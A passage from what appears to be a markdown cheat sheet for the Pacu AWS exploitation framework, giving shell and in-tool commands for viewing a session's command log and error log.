tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/cmd_log.txt"
```
<!-- cheat
var session_name
-->

### Error log

Show error log with Pacu.

Inside Pacu, print the active session error log.

```sh title:"Pacu Show Error Log"
debug
```
<!-- cheat -->

### Error log file

Run error log file with Pacu.

Tail the Pacu error log for a session from the shell.

```sh title:"Pacu Run Error Log File"
tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/error_log.txt"
```
<!-- cheat
var session_name
-->
